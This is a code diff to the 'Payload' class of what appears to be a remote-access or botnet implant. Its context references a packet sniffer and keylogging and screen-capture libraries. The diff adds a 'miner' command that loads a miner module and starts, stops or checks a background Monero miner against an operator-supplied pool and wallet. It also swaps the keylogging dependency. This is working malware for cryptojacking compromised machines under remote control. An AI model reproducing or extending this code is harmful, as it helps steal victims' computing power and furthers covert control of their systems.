@@ -99,7 +99,7 @@ class Payload():
         """
         self.handlers = {}
         self.child_procs = {}
-        self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','twilio','mss']}
+        self.remote = {'modules': [], 'packages': ['cv2','requests','pynput','twilio','mss']}
         self.gui = True if kwargs.get('gui') else False
         self.owner = kwargs.get('owner')
         self.flags = self._get_flags()
@@ -895,6 +895,87 @@ class Payload():
                     return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='miner <start/stop/status> [url] [user] [threads]')
+    def miner(self, args=None):
+        """
+        Start, stop or check status of the cryptocurrency miner
+        
+        `Required`
+        :param str args:  start [url] [user] [threads], stop, status
+        
+        `Optional`
+        :param str url:   mining pool URL (e.g., stratum+tcp://xmr-eu1.nanopool.org:10300)
+        :param str user:  wallet address or username
+        :param int threads: number of threads to use (default: 1)
+        """
+        try:
+            if not args:
+                return self.miner.__doc__
+                
+            args = str(args).split()
+            action = args[0].lower()
+            
+            # Import the miner module
+            import importlib.util
+            module_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'modules', 'miner.py')
+            
+            if not os.path.exists(module_path):
+                return "Error: miner module not found"
+                
+            spec = importlib.util.spec_from_file_location("miner", module_path)
+            miner_module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(miner_module)
+            
+            # Check if xmrig binary exists
+            if not hasattr(self, 'miner_instance'):
+                self.miner_instance = None
+                
+            # Handle different actions
+            if action == 'start':
+                if len(args) < 3:
+                    return "Error: missing required arguments. Usage: miner start [url] [user] [threads]"
+                    
+                url = args[1]
+                user = args[2]
+                threads = int(args[3]) if len(args) > 3 else 1
+                
+                # Stop any existing miner
+                if self.miner_instance:
+                    self.miner_instance.stop()
+                    
+                # Create new miner instance
+                self.miner_instance = miner_module.Miner(
+                    url=url,
+                    user=user,
+                    threads=threads,
+                    background=True
+                )
+                
+                # Start mining
+                result = self.miner_instance.start()
+                return f"Miner started: {result}"
+                
+            elif action == 'stop':
+                if not self.miner_instance:
+                    return "Miner is not running"
+                    
+                result = self.miner_instance.stop()
+                return f"Miner stopped: {result}"
+                
+            elif action == 'status':
+                if not self.miner_instance:
+                    return "Miner is not running"
+                    
+                result = self.miner_instance.status()
+                return f"Miner status: {result}"
+                
+            else:
+                return f"Invalid action: {action}. Use 'start', 'stop', or 'status'"
+                
+        except Exception as e:
+            return f"Miner error: {str(e)}"
 
 
     def send_task(self, task):
